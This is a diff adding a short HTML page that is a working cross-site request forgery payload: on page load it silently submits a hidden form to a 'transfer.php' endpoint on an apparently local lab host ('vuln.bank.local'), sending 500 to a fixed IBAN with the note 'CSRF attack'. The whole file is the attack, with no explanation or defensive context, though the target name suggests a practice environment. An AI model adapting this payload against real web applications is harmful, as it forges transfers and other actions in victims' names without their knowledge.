@@ -1,0 +1,9 @@
+<html>
+<body onload="document.forms[0].submit()">
+  <form method="POST" action="http://vuln.bank.local:8080/transfer.php">
+    <input type="hidden" name="to_iban" value="FR7630001007940000000000042">
+    <input type="hidden" name="amount" value="500">
+    <input type="hidden" name="note" value="CSRF attack">
+  </form>
+</body>
+</html>
